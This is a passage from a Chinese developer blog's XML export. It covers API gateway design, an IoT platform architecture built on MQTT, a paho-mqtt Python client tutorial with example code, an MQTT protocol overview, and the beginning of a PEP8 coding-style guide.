网关在实现时一定要考虑横向扩展和API热更新的能力, 避免API网关宕机。 高扩展前面说到, 一些非业务功能的需求需要网关提供, 比如: 例如日志、安全、负载均衡策略、鉴权等, 这就需要网关层提供这样一种机制，使得可以灵活地进行这些调整和变化，而不用频繁对网关层进行改动，确保网关层的稳定性。比如nginx采用模块来进行扩展, 并且支持模块的动态加载。 高运维API在上线、发布过程中，都需要涉及到网关层的配合，例如，需要网关层知道API发布的地址，API的接口形式、报文格式，也需要网关层对后台API进行封装。在API调整后，需要作出相应的修改。所以，API网关设计时，需要明确网关层与服务层的职责切分与协作模式，使得API的管理、发布更加高效。 落地方案针对以上的需要, 如何设计一款还靠谱的API网关喃? 设计原则 高性能: 采用Golang来进行开发, 确保性能 高可用: 1. 网关层采用无状态设计, 将认证模块独立处理 2. 优雅下线, 采用go 的graceful做处理 高扩展: 采用http中间件的方式, 提供灵活的扩展能力 功能点一个完整的API网关应该具有如下几方面的功能: 服务发现, 负载均衡, 服务健康状态检查API Gateway需要知道每一个微服务的IP和端口。在传统应用中，你可能会硬编码这些地址，但是在现在云基础的微服务应用中，这将是个简单的问题。基础服务通常会采用静态地址，可以采用操作系统环境变量来指定。但是，探测应用服务的地址就没那么容易了。应用服务通常动态分配地址和端口。同样的，由于扩展或者升级，服务的实例也会动态的改变。因此，API Gateway需要采用系统的服务发现机制，要么采用服务端发现，要么是客户端发现。如果采用客户端发现服务，API Gateway必须要去查询服务注册处，也就是微服务实例地址的数据库。发现了多个微服务的实例过后, 需要采用负载均衡机制进行调度, 并且需要检查服务状态, 当服务离线时, 请求将不会调度到该节点。 熔断模式也叫circuit break模式，它可以将客户端从无响应服务的无尽等待中停止。如果一个服务的错误率超过预设值，将中断服务，并且在一段时间内所有请求立刻失效。具体可以参考: 熔断器 速率限制无论如何 你后端的服务资源不可能无限动态扩展, 终有读, 为了保护后端服务不被击垮, 可以在网关层做访问速率的限制。 基于IP的访问控制这个是WAF的基本功能, 避免DOS, 封锁某个IP的恶意访问。 协议转换网关提供RESTful的HTTP的接口, 但是后端 可能提供服务的协议可能各不相同通, 比如gRPC, HTTP, MQ, 等。因此网关应该能适配多协议的支持。 请求路由基于URL的路由功能 API使用统计记录API Metric如请求次数、请求大小、响应状态和延迟，可视化API Metric 参考浅谈 API Gateway微服务架构中的API Gateway微服务实战（二）：使用API Gateway企业级API网关的设计面向服务架构]]></content>
      <categories>
        <category>微服务</category>
        <category>APIGateway</category>
      </categories>
      <tags>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT架构]]></title>
    <url>%2F2017%2F07%2F17%2Fiot-architecture%2F</url>
    <content type="text"><![CDATA[最近开发了一次IOT组件, 在此期间也参考了下其他IOT平台的设计架构, 有所感想, 因此将其记录下来, 和大家分享, 欢迎交流。 IOT是什么IoT是Internet of Things的缩写, 它是互联网从人向物的延伸, 核心和基础仍然是互联网技术，是互联网技术基础上的延伸和扩展。 它将各种信息传感设备，如射频识别装置、红外感应器、全球定位系统、激光扫描器等种种装置, 按约定的协议, 将任何物品与互联网相连接, 达到物品之间进行信息交换和通讯的目的，以实现智能化识别、定位、追踪、监控和管理等。IOT也将加速AI的觉醒, 它将万物互联, 再加上成熟的大数据处理, 深度学习的应用 会让万物都带有灵性, 这是多么宏大的一个时代, 2016被称为AI的元年, 随着IOT的加速, 我们将是这样一个时代的见证者,见证AI觉醒的第一代人。下面是一张物联网在工业引用的一张图这样看来未来很美好, 但是现实很残酷, 如何实现落地一套可靠的IOT方案任然是个难题, 在参考了一些国外的方案过后, 结合自己的实践, 给出了一种我认为的可落到的IOT方案架构。 IOT的难点IOT在落地过程中有诸多难点, 国内很多IOT也是刚起步的状态, 能参考的就国外几家云的大厂商。 涉及技术众多IOT涉及到很多技术, 下面一张图 从几个维度展示了IOT涉及到的一些技术点:从技术上看, 涉及众多技术, 因此对开发者有一定的要求, 招人是个问题。 架构难设计IOT面对的是万物, 在万物接入时需要考虑到 数据的安全, 链接的管理, 海量流数据上传, 海量数据的存储 管理 分析。综合来说 架构设计必须满足: 海量、通用、可扩展、简单 因此这是一套庞大灵活的系统, 而这样的系统 往往云厂商比较有经验, 比如Openstack的设计就是一个不错的架构。整体而言IOT的架构应该属于微服务架构, 微服务架构的设计和开发 往往都是把双刃剑, 如果划不清服务的边界(领域划分)和规范不了服务交互的流程和方式, 那么这样的架构也是一个灾难, 最终造成 理不断剪还乱的一个局面。下面是一张基础的IOT架构图, 能很好的描述IOT中核心的关键点: 架构概述再复杂的事儿, 也需要抓住其核心点 才能有效展开。因此我们需要知道这个架构的精髓是啥, 在围绕那核心点。参考上面那张架构图, 我们可以理解IOT的核心在完成这样几件事: 连接设备 设备数据分析 设备数据运营与可视化 核心之外是以下周边服务, 用于提升和扩展功能: 功能平台: 比如消息通知, 提供对平台核心功能以外的一些补充。 架构详解在参考了AWS和Azure的IOT过后, 结合自己的认识,总结出来的IOT架构图。按照领域对模块进行划分, 主要由几下几个模块组成: 连接设备: 本地: 负责设备数据的采集上报与反向控制。 云端: 将所有设备接入云，接收数据，同时负责管理这些设备的授权和限制 数据分析: 通过提供 离线计算或者在线计算的可编程接口 为用户提供数据分析的能力 数据可视化与运营: 采集上报的数据以及分析过后的数据的可视化, 数据标记, 数据授权等带业务性质的数据管理。 API网关: 负责请求的统一代理, 屏蔽掉内部系统的复杂性。 用户管理: 统一的用户体系 用于用户管理, 权限管理 概念简介整个架构中 设计到如下一些概念: 业务概念: 与数据相关, 用户自己定义的 设备(device): 用户的需要接入互联网的实体设备 系统概念: 与系统组件相关, 通过系统组件来接入的数据的组件 代理(agent): 获取设备信息和控制设备的代理 设备网关代理(device-gateway-proxy): 代理device-gateway验证设备, 代理设备与云端通信 设备网关(device-gateway): 云端设备网关, 管理设备接入整个系统对于不同角色的划分: 超级管理员: 具有系统已经数据的所有权限 设备管理员: 负责将设备加入系统, 查看设备的数据, 以及以设备为维度的数据权限分配 数据运营员: 负责点位数据的多维度管理(基础维度是设备), 以业务为维度的数据权限分配 算法管理员: 负责管理和运行相应维度的算法(基础维度是设备), 以及数据的查看权限 普通用户或者第三方开发者: 负责点位数据的多维度查看(基础维度是设备) 设备连接设备的连接分为2部分云端和本地2部分构成, 由于云端和本地网络的差异, 需要考虑: 网络的安全 网络的不稳定为了方便本地设备与云端相连, 需要约定一个协议, 因此需要考虑: 通信协议的多适配: 比如MQTT, HTTP, CoAP等 数据格式定义由于本地网络的复杂多变性, 我们可能需要面对不同的场景: 设备能直接联网上报数据 设备无法联网, 需要将数据发生给本地一个网关代理, 由网关代理统一上报数据设备连接的一个架构示意图: 本地本地会负责设备数据的采集上报以及控制, 这些功能由一个agent负责完成, 它功能方向如下: 数据采集与上报: 配置云端凭证, 按照约定协议上报设备数据。 接收云端控制: 向云端汇报控制指令, 接收云端发起的控制,以及返回执行结果。 设备代理(agent)设备代理负责收集设备的数据, 然后上报给云端网关, agent位于数据第一线, 需要考虑良好的扩展性, 因此适合采用 插件式 驱动开发模式。采集器需要从云端获取证书, 配置云端设备编号, 然后按照指定的报文格式 将数据上报给云端。比如云端规范的数据上报格式,以influxDB的数据写入格式为例说明:1234measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]1. 一类设备一个库, 比如车, 比如飞机, 一个库里面存放所有这类设备的指标, 一组相关的指标一个组, 比如变速器, 齿轮箱, 算法计算的平均飞速2. 所有与数据无关的数据 均以标签的方式录入, 这些Tag分为2类: 1.系统标签: device-id, collector-id 2. 用户自定义标签 agent核心功能点概述: 数据采集与上报 数据采集: 以插件的形式, 支持多协议适配, 默认情况下 只要数据符合规范 就可以上报 数据处理: 如何数据不符合规范, 需要编写 数据处理插件, 处理成合法规则 聚合数据: 如果数据量过大, 可以编写聚合插件, 对数据进行聚合, 比如针对设备震频数据。 数据上报: 经历所有以上步骤过后, 将数据通过设备的数据上报管道上报云端 设备控制: 控制指令上报: agent启动时需要将 已经实现的控制指令通过控制上传通道向云端汇报。 执行控制指令: agent订阅控制下发管道, 当有命令到来时, 立马执行, 并且将结果写回控制上传管道。 异常处理: 设备下线异常: 由于设备下线无法和设备建立连接, 无法采集数据(DeviceOffLineError), 通过控制上传通道上报 点位采集异常: 由于设备没有该点位, 无法获取到该点位数据(NoPointError), 通过控制上传通道上报 agent控制: 代理配置: 通过控制下发通道, 下发代理配置. 代理重启: 通过控制下发通道, 得知代理重新通知, 重启代理. 状态上报: 通过控制上传通道, 汇报代理状态 agent异常: 代理运行异常: 代理异常下线及时通知云端(AgentRuntimeError) 网关代理(device-gateway-proxy)网关代理主要运用于代理无法访问公网的场景(有火墙), 它在本地网络中扮演着云端网关的角色, 控制着所有设备的连接, 因为他是代理, 所有相关控制信息均从云端网关获取。网关代理在设计时需要满足如下原则: 透明性: 对于云端来说, 不能因为代理而带来设备处理的差异性, 因此代理主要功能是代理设备 与 云端通信, 对于云网关来说 看到的依然是设备,而不是代理。 缓存性: 代理需要面临网络中断,所以需要有数据缓存机制, 并且可以配置存储策略。以下是gateway-proxy的核心功能概述: 数据上报: 检查设备合法性: 网关代理能代理那些设备建立连接 需要从云端网关获取, 如果设备不合法, 则拒绝为该设备建立连接。 数据上报: 网关代理模拟agent与真正的网关建立连接, 通过设备数据上报通道上报数据到云端。 设备控制: 控制指令上报: 代理设备建立控制上传通道, 上报控制指令到云端。 执行控制指令: 代理设备接收控制下发通道里面的 控制指令, 调度给agent执行, 将结果返回到控制上去通道。 异常处理: 设备下线异常: 由于设备下线无法和设备建立连接, 无法采集数据(DeviceOffLineError), 通过控制上传通道上报 点位采集异常: 由于设备没有该点位, 无法获取到该点位数据(NoPointError), 通过控制上传通道上报 网关代理控制: proxy配置: 通过proxy的控制上传通道 请求 proxy的配置信息, 配置proxy需要代理的设备列表 proxy从启: 通过proxy的控制下发通道 执行云端对proxy的操作 proxy状态上报: proxy通过控制上传通道 上报自身状态 agent状态代理上报: proxy代理agent 上报状态(proxy控制上传通道) agent异常代理上报: proxy代理agent 上报异常(proxy控制上传通道) 网关代理异常: proxy运行异常: 及时向云端上报(ProxyRuntimeError), 通过proxy控制上传通道 云端(device-gateway)云端负责设备的连接的组件我们称之为设备网关(device-gateway), 它负责接收设备上传的数据与设备的控制。设备网关在设计时需要满足如下原则: 数据安全: 为了确保网关和数据上报者之间这段公网数据链路的安全, 需采用TLS进行加密和双向认证。 数据网关需充当CA的角色, 向agent或者颁发数字证书 接入设备资产的管理 数据存储: 在数据存入数据库之前,这些数据被称为事件, 数据被存储之后成为历史数据, 事件和历史数据分别对应不同的场景device-gateway的控制层功能概述: 类型管理:连接上云端的设备必须要指明设备的类型, 设备类型用于校验 设备上传的数据 是否合规, 如果不合规,就丢弃掉, 但是需要记录日志, 让用户可以查看类型的定义以Json为主, 需要定义 属性名称(字段名称), 字段的值的数据类型, 以及其他字段的相关信息。 类型的增删改查 设备管理 设备创建: 必须参数参数: 设备名称, 接入方式(通过agent接入还是通过proxy接入), 设备类型(先定义类型) 可选参数: 地理位置, 设备标签, 其他属性,真正创建时我们需要考虑: 配额检查(限制一个用户可以创建的设备数) 如果通过agent接入, 为agent颁发设备接入证书和私钥 生成接入云端的用户和密码 配置设备和云端通信的通道 云端订阅这些通道, 等待数据上报或者来自agent的请求 查看设备:设备创建成功过后用户可以查看到: 设备的基本信息, 比如名称, ID, 接入方式, 地理位置, 创建时间 设备标签信息, 这是简单的资产, 用于通过标签分类设备, 简单的资产分类管理 设备通道信息, 数据上报通道和设备控制通道的名称 接入信息, 接入云端的用户名和密码 设备状态信息, 设备是否下线, 能否和设备通信 agent状态信息, agent是否运行 如果是通过proxy接入, 显示proxy名称和状态信息 修改设备: 提供设备基本信息的修改: 设备名称, 接入方式, 地理位置, 以及其他用户自定义属性的修改 禁用设备: 禁用设备后, 将禁止设备与云端建立连接: 如果是agent接入, 剔除该agent的回话, 并禁止该设备 与云端建立连接 如果是proxy接入, 通知proxy, 停止为该设备建立与云端的连接 启用设备: 启用设备后, 恢复允许设备与云端建立连接: 如果是agent接入, 撤销设备禁止接入云端的控制 如果是proxy接入, 通知proxy, 重新为该设备建立与云端的连接 删除设备: 删除设备后, 与设备相关的所有连接都将断开, 该设备从此以后将无法与云端建立连接 取消该设备通道的所有处理 清除接入用户信息, 用户无法和云端建立连接 如果是proxy接入, 通知代理 该设备已经删除, 更新代理列表, 停止为该设备代理 清除设备相关元数据 设备配额管理: 限制用户可以创建的设备数量 查询配置: 修改配额: 由管理员修改配额 设备标签管理: 基于标签的资产管理 标签的创建,查看,修改,删除 为设备添加标签 移除设备的标签 设备状态影子: 查看设备最新状态, 设备数据接入云端时需要通过 设备类型 检查设备的上报的数据是否合法, 并且经最新状态 录入, 用户可以看到该设备的 最新状态数据. 设备的反向控制: 控制指令查看控制指令由agent的控制器实现, 在agent启动时上报给云端: 控制指令的基本信息: 控制指令的名称, 功能说明, 使用方式, 预期结果, 异常说明。 控制指令的上报时间, 执行权使用者列表 控制指令的执行记录 执行权分配将控制指令的执行权分配给有个用户, 该用户可以执行该控制指令 执行权回收将控制指令的执行权回收。用户将没有改指令的执行权 执行控制指令默认仅有管理员可以执行控制指令, 执行控制指令, 得到执行结果 禁用控制指令 由管理员决定是否禁用该控制指令 启用控制指令由管理员决定是否启用该控制指令 proxy管理: 创建代理: 必须参数: 代理名称, 可选参数: 地理位置, 其他创建属性 查看代理: 名称, 地理位置, 其他属性, 创建时间 代理状态: 未接入, 运行中, 禁用 代理的 数字签名证书, CA证书, 代理私钥 代理自己使用的控制通道(代理和云端通信的接口), 和异常上报通道 修改代理:名称, 地理位置, 其他属性 删除代理: 确认该代理下面没有设备后方可以删除, 移除后的设备属于无上报方式的设备, 吊销代理的证书 剔除代理 的上报回话(非常危险, 如果代理正在上报数据) 清除代理信息 禁用代理: 禁止该代理发布数据到云端(的数据管道) 启用代理: 禁止该代理发布数据到云端(的数据管道) 查看代理下的设备: 列出该代理下面的设备列表 添加设备到该代理下面 移除该代理下面的设备 device-gateway后台功能概述: 数据存储负责将数据存储到后端存储 状态数据存储 热数据存储 历史数据存储 数据可视化与运营(data-manager)主要负责数据的管理和查看, 数据以类型组织在一起, 以点位为核心, 用户通过为这些 数据添加标签 来添加 数据维度, 方便业务使用。 数据分类提供数据的查看与运营管理, 数据以指标的方式存储, 用户通过标签来运营数据。运营的数据主要由2类构成: 物理指标数据: 采集上来的原始数据, 以点位的最小逻辑单元为指标,比如 齿轮箱等。 分析过后的指标数据: 经过分析过后的数据 以算法为指标, 分析根据需要为这些数据打算标签。(比如打算设备标签) 数据查看提供对数据的基本展现的支持, 但不提供大量原始数据的导出功能, 大量原始数据是留给计算平台使用的, 如需导出请使用导出工具进行导出。 数据查询配置查看:  历史数据分层配置: 1. 按时间为维度进行划分, 默认为3个月 2. 按容量进行划分, 默认为最近1w条数据, 默认按规则1执行。 状态数据查询容量限制: 默认为1000条数据, 及设备点位不得默认不得超过1000 历史数据查询容量限制: 默认为100 * 100条数据, 及设备点位不能超过100个，每个点位的数据不得超过100条 数据查询配置修改: 修改以上那些默认配置 查询数据: 状态查询: 也就是当前接入事件的查询(用于查看当下接入的数据, 不能查看历史数据), 如果设备接入异常 请显示接入异常信息, 以websocket 进行实时提供 历史查询: 也就是趋势查询 热数据查询: 如果数据量过大，需要分组进行聚合 冷数据查询: 如果数据量过大，需要分组进行聚合 数据标签管理 数据标签查询, 默认标签属于系统标签(比如数据属于那台设备, 数据是由那个采集器采集上来的), 禁止修改, 为只读状态, 其他是用户为数据 进行的自定义标签 添加标签: 为数据 添加标签， 标签有长度限制(最长不得超过16个字符) 删除标签: 删除标签,但是删除之前 需要确认数据是否已经授权, 如果已经授权分享, 需要撤销分享 才能删除 数据授权 用户按照自己的需要 将数据打上标签, 或者使用默认标签, 将对应的数据 分析给其他用户访问. 数据分享查询: 查询那些数据,被分析给了那些用户 分享权限撤销: 撤销已经分析出去的数据授权 数据分享: 指定某些用户可以访问那些标签的数据。 数据分析数据分析围绕算法和任务进行展开, 关键的在于 算法的高度可定制化, 算法测试, 运行时检查, 以及算法执行过程中任务的可视化。功能是满足高级用户 对于数据分析的需求。 通过算法对数据进行深度分析的功能。 实时计算 离线计算(报表统计和深度学习, 深度需要依赖大量数据训练出模型，然后通过模型 应用到事件分析, 达到智能分析的目的) 混合计算: 比如先使用离线计算训练模型, 然后将模型 应用到实时计算, 或者使用实时计算作为测试数据,以历史数据作为训练数据 进行交叉验证,以便训练准确的模型。 算法管管理算法文件, 算法文件表现为一个脚本文件, 对于storm 平台而已, 算法文件是groove脚本, 对于spark 平台而言, 算法文件 可以是spark支持的多种语言的脚本。 上传算法: 上传脚本文件, 算法名称(默认是算法文件的名称,去掉后缀), 算法描述信息(包含算法要解决的问题, 输入参数的解释和输出参数的解释), 算法运行平台() 下载算法: 下载算法文件。 删除算法: 删除算法文件. 更新算法元数据: 更新算法的名称 或者算法的描述信息 查看算法: 查看所有算法。 算法访问授权: 授权算法给某个用户访问。 算法授权撤销: 撤销某个用户访问某个算法的权限。 任务执行算法 运行时产生一个真正的任务, 因此运行算法 需要有以下这些参数: 算法文件, 通过指定算法文件的id来完成 算法的输入和输出: 扫描获取算法文件的 输入和输出形参() 选定输入源的形参对应的数据, 通过去输入源 查看得出, 选择输出源 对应的名称。(可以检查输入源是否有数据) 执行平台, 根据算法文件id, 得知该算法调度到那个平台上运行(jstrom, spark), 如果没有对应平台支持, 则报错 现有物联网平台参考国内外物联网平台架构微软Azure IoT亚马逊AWS IoTIBM Watson IOT]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python的mqtt客户端使用说明]]></title>
    <url>%2F2017%2F07%2F04%2Fmqtt-reconnect%2F</url>
    <content type="text"><![CDATA[最近使用Python写一个后台服务处理mqtt里面的事件时遇到了一个麻烦: mqtt连接重置时(重启mqtt服务后), 之前pub消息的线程不能正常工作了, 经过多次踩坑, 终于解决. 引发问题的原因是我使用姿势不对造成的, 一旦你使用姿势不对 会造成一些奇怪的问题,并且很难解决。 因此请正确使用mqtt。 注意事项关于MQTT协议的介绍请参考之前博客: 物联网之MQTT, 只有在了解MQTT协议过后, 我们才能以正确的姿势使用她, 以下是我觉得需要注意的地方: 按需使用MQTT的Qos, 当Qos=2时可靠性最高, 但是会损失性能。 尽量使用client_id来标示客户端, 但是注意 如果2个客户端使用同一个client_id, 会出现client争抢连接的状态, 所以全局持有一个client是不错的选择。 注意异步处理, 在回调函数中不能阻塞。 将所有数据处理逻辑放到回调函数里面, 防止链接重置时，漏掉处理逻 在on_message的回调里面 处理所有的订阅消息 断开连接时尽量从新连接, 避免mqtt离线后, 重新上线, 造成服务连接异常。(注意loop的返回, 保证loop网络事件持续处理中) 环境介绍介绍下我的测试环境: Python Version: 3.6 MQTT Server: emqttserver:2.2-rc1 MQTT Client: paho-mqtt: 1.3.0 emqtt server安装参考emqtt docker安装python mqtt客户端的安装请参考Github地址 客户端使用介绍paho-mqtt有一个客户端类, 我们主要使用该类来和mqttserver进行交互, 那么如何使用这个类喃: 建立连接: 使用connect()/connect_async()来链接到broker(mqtt server) 断开连接: 使用disconnect()方法来断开和broker(mqtt server)之间的网络连接。 处理网络事件: 请频繁调用loop()来维持和broker(mqtt server)之间的网络事件。如果不想自己频繁的调用loop来维护网络事件, 可以使用loop_forever()方法来处理,该方法会帮你循环调用loop, 因此该方法是一个阻塞的方法。如果不想在程序里面阻塞,可以使用loop_start()方法,该方法会启动一个线程在后台执行loop_forever。 订阅消息: 使用subscribe()方法来订阅topic和接收数据 发布消息: 使用publish()方法来发布消息 mqtt的通信是异步的, 通过网络事件来进行回调处理, 因此我们基本采用回调来编程, 回调函数的签名如下, 所有的回调函数都2个固定参数: client: 回调时传递来的客户端实例 userdata: user的任何类型的数据, 实例化client时传入, 用户自己使用。 on_connect(client, userdata, flags, rc)当broker响应了我们链接之后调用, 涉及到的参数: flags: 是一个字典, 包含broker返回的响应标志现在只有1中标志: session present, 通过flags[‘session present’]获取到该标志里面的内容, 当clean session为0时(clean_session=False), broker会保存client的的session信息, 该信息会在client重新上线时, 通过session present这个标志 返回给客户端。 rc: retrun code, 返回状态码 RC Status Description 0 successful connected 1 refused incorrect protocol version 2 refused invalid client identifier 3 refused server unavailable 4 refused bad username or password 5 refused not authorised 6-255 refused Currently unused on_disconnect(client, userdata, rc)当client和broker断开连接时调用. rc表示断开连接是的状态 RC Description 0 MQTT_ERR_SUCCESS, 客户端调用disconnect()方法断开连接, 属于正常断开 1 网络等其他原因照成的连接断开, 异常断开 on_message(client, userdata, message)当客户端订阅的topic上有数据 被接收时调用, message是一个MQTTMessage的类, 该类包含了message的所有数据: topic: 数据所在的topic payload: message的数据部分 qos: 该消息的质量: 0, 1, 2 retain: 该消息是否是保留消息, 如果为True 这为保留消息, 如果为False就是最新的消息。 mid: message id on_publish(client, userdata, mid)当使用publish方法将message传输到broker后调用, 但是这要针对不同的qos, 对于qos1和2而言, 这表示消息已经到达后的回调, 如果qos是0那么仅仅表示消息离开了客户端之后的回调。这个回调很重要，因为即使publish()调用返回成功，并不总是意味着已经发送了消息 mid: 表示已经publish出去的消息的message id on_subscribe(client, userdata, mid, granted_qos)当broker响应了subscribe请求之后调用。 mid: 被订阅消息的message id granted_qos: broker为不同的订阅请求授权的qos级别。是一个列表。 on_unsubscribe(client, userdata, mid)当broker响应了取消订阅的请求过后调用。 mid: 取消订阅的消息的message id on_log(client, userdata, level, buf)MQTT通信过程中的一些Debug信息 level: 日志级别MQTT_LOG_INFO, MQTT_LOG_NOTICE, MQTT_LOG_WARNING, MQTT_LOG_ERR, and MQTT_LOG_DEBUG buf: message buffer, debug信息本身。 示例代码我Github上有: 完整示例代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#!/usr/bin/env python3# -*- coding: utf8 -*-import threadingimport loggingimport timefrom paho.mqtt.client import ClientFORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'logging.basicConfig(format=FORMAT, level=logging.INFO)logger = logging.getLogger()def pub_topic_test01(client): while True: client.publish(topic="test01", qos=2, payload="test01 topic data") time.sleep(2)def pub_topic_test02(client): while True: client.publish(topic="test02", qos=2, payload="test02 topic data") time.sleep(2)class MyMQTTClass(Client): """ mqtt client for deal data """ def __init__(self): super(MyMQTTClass, self).__init__(client_id="test client", clean_session=False) def on_connect(self, client, obj, flags, rc): logger.info("on connect, rc: %s" % rc) # 链接过后先处理sub client.subscribe(topic="test01", qos=2) client.subscribe(topic="test02", qos=2) logger.info("start topic service1...") t1 = threading.Thread(target=pub_topic_test01, args=(client,)) t1.start() self.worker1 = t1 logger.info("start topic service2...") t2 = threading.Thread(target=pub_topic_test02, args=(client,)) t2.start() self.worker2 = t2 def on_message(self, client, obj, msg): logger.debug("on message, topic: %s, qos: %s, data: %s" % (msg.topic, msg.qos, msg.payload)) if msg.topic == "test01": logger.info("deal test01, data: %s" % msg.payload) elif msg.topic == "test02": logger.info("deal test02, data: %s" % msg.payload) else: logger.info("other topic %s, data: %s" %(msg.topic, msg.payload)) def on_publish(self, client, obj, mid): logger.debug("publish -&gt; ,mid: %s" % mid) def on_subscribe(self, client, obj, mid, granted_qos): logger.debug("subscribed &lt;- ,mid: %s, qos: %s" %(mid, granted_qos)) def on_log(self, mqttc, obj, level, string): logger.debug("mqtt debug: %s" % string) def on_disconnect(self, client, userdata, rc): logger.info("disconnect: %s" % rc) while rc == 1: try: client.reconnect() logger.info("reconnect success") rc = 0 except Exception as e: logger.error("reconnect error, %s retry after 3s" % e) time.sleep(3) def run(self): self.connect("172.16.112.251", 1883, 60) while True: rc = self.loop() if rc != 0: time.sleep(1) rc = self.loop() logger.info("recovery from error loop, %s" % rc)def main(): client = MyMQTTClass() client.run()if __name__ == "__main__": main()]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[物联网之MQTT]]></title>
    <url>%2F2017%2F07%2F02%2Fmqtt-introduce%2F</url>
    <content type="text"><![CDATA[物联网物接入协议MQTT 相对来说，IoT的技术挑战，主要在安全隐患、连接管理、海量数据管理，用关键字来说就是海量、通用、可扩展、简单。物接入云端，有很多挑战, 数据的安全尤为重要 协议比较协议比较 MQTT简介MQTT是一个客户端服务端架构的发布/订阅模式的消息传输协议。它的设计思想是轻巧、开放、简单、规范，易于实现。这些特点使得它对很多场景来说都是很好的选择，特别是对于受限的环境如机器与机器的通信(M2M)以及物联网环境(IoT)。总体来说MQTT有如下特性: 轻量级的 machine-to-machine 通信协议。 publish/subscribe模式。 基于TCP/IP。 支持QoS。 适合于低带宽、不可靠连接、嵌入式设备、CPU内存资源紧张。 是一种比较不错的Android消息推送方案。 FacebookMessenger采用了MQTT。 MQTT有可能成为物联网的重要协议 mqtt协议简介 协议简介 报文格式bit76543210byte 1Message typeDUPQoS levelRETAINbyte 2Message length (between one and four bytes)byte 3… if needed to encode message lengthbyte 4… if needed to encode message lengthbyte 5… if needed to encode message length 控制指令 Message Type Value Description CONNECT 1 Client request to connect to Server CONNACK 2 Connect Acknowledgment PUBLISH 3 Publish message PUBACK 4 Publish Acknowledgment PUBREC 5 Publish Received (assured delivery part 1) PUBREL 6 Publish Release (assured delivery part 2) PUBCOMP 7 Publish Complete (assured delivery part 3) SUBSCRIBE 8 Client Subscribe request SUBACK 9 Subscribe Acknowledgment UNSUBSCRIBE 10 Client Unsubscribe request UNSUBACK 11 Unsubscribe Acknowledgment PINGREQ 12 PING Request PINGRESP 13 PING Response DISCONNECT 14 Client is Disconnecting Qos mqtt的状态机wo]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>iot</tag>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python编码风格]]></title>
    <url>%2F2017%2F06%2F24%2Fpython-style-pep8%2F</url>
    <content type="text"><![CDATA[最近做项目一直使用Golang, 距离上次使用Python已经半年之久了, 对于Go来说有fmt帮忙格式化, 解决了绝大部分编码风格问题, 而Python则需要自己注意,根据官方指导PEP8或者一些最佳实践比如Google Style来控制风格。时间久了 一些细节部分就忘记了, 于是翻阅之前写的博客, 受益良多, 于是打算把之前的这几篇博客迁移过来, 顺便更新, 方便以后查阅。 关于本文本文主要参考PEP8(Python版本标准库的编码约定),以及Google Style编码风格, 但却不会完全按照PEP8进行翻译, 我不会贴出不合规范的代码, 尽量简洁易懂, 方便快速阅读, 如果想看完整版本的PEP8相关文档, 请移步参考文档部分。 风格指南的目的风格指南的目的在于统一编码风格,让代码有规可循,这样人们就可以专注于”你在说什么”, 而不是”你在怎么说”.从而改善Python代码的可读性,即PEP 20所说的“可读性计数”(Readability counts). 风格指针在于统一风格, PEP8仅仅是官方指导, 本地编码风格同样重要, 如果满足可读性, 优先保持本地风格, 使得你整体项目的代码风格一致。 代码布局 每级缩进用4个空格(强烈建议使用4个空格作为缩进), 不要混用空格和Tab, Python3中不允许混合使用Tab和空格缩进 123def get_version(version=None): "Returns a PEP 386-compliant version number from VERSION." version = get_complete_version(version) 括号中使用垂直隐式缩进或使用悬挂缩进（对准左括号） 12foo = long_function_name(var_one, var_two, var_three, var_four) if语句跨行时，两个字符关键字(比如if)加上一个空格，再加上左括号构成了很好的缩进。 1234# Add some extra indentation on the conditional continuation line.if (this_is_one_thing and that_is_another_thing): do_something() 右边括号也可以另起一行（右括号回退） 12345678my_list = [ 1, 2, 3, 4, 5, 6,]result = some_function_that_takes_arguments( 'a', 'b', 'c', 'd', 'e', 'f',) 最大行宽限制所有行的最大行宽为79字符。文本长块，比如文档字符串或注释，行长度应限制为72个字符。续行的首选方法是使用小括号、中括号和大括号反斜线仍可能在适当的时候。其次是反斜杠。123with open('/path/to/some/file/you/want/to/read') as file_1, \ open('/path/to/some/file/being/written', 'w') as file_2: file_2.write(file_1.read()) 空行 空二行: 顶级定义之间空两行, 比如函数或者类定义. 空一行: 方法定义, 类定义与第一个方法之间, 都应该空一行. 函数或方法中, 某些地方要是你觉得合适, 就空一行.12345678910111213141516171819202122232425class StreamingHttpResponse(HttpResponseBase): """ A streaming HTTP response class with an iterator as content. This should only be iterated once, when the response is streamed to the client. However, it can be appended to or replaced with a new iterator that wraps the original content (or yields entirely new content). """ streaming = True def __init__(self, streaming_content=(), *args, **kwargs): super(StreamingHttpResponse, self).__init__(*args, **kwargs) # `streaming_content` should be an iterable of bytestrings. # See the `streaming_content` property methods. self.streaming_content = streaming_content @property def content(self): raise AttributeError("This %s instance has no `content` attribute. " "Use `streaming_content` instead." % self.__class__.__name__) @property def streaming_content(self): return map(self.make_bytes, self._iterator) 模块导入 导入在单独成行, 同一个模块的多个对象被导出时使用() 导入始终在文件的顶部，在模块注释和文档字符串之后，在模块全局变量和常量之前。 推荐绝对路径导入，因为它们通常更可读，而且往往是表现更好的（或至少提供更好的错误消息。 禁止使用通配符导入。 导入顺序如下：标准库进口,相关的第三方库，本地库。各组的导入之间要有空行。123456789101112131415161718192021222324252627282930313233# 标准库import asyncioimport osimport tracebackfrom functools import partialfrom inspect import isawaitablefrom multiprocessing import Processfrom signal import ( SIGTERM, SIGINT, signal as signal_func, Signals)from socket import ( socket, SOL_SOCKET, SO_REUSEADDR,)from time import time# 第三方库from httptools import HttpRequestParserfrom httptools.parser.errors import HttpParserErrortry: import uvloop as async_loopexcept ImportError: async_loop = asyncio# 本地库from sanic.log import log, netlogfrom sanic.response import HTTPResponsefrom sanic.request import Requestfrom sanic.exceptions import ( RequestTimeout, PayloadTooLarge, 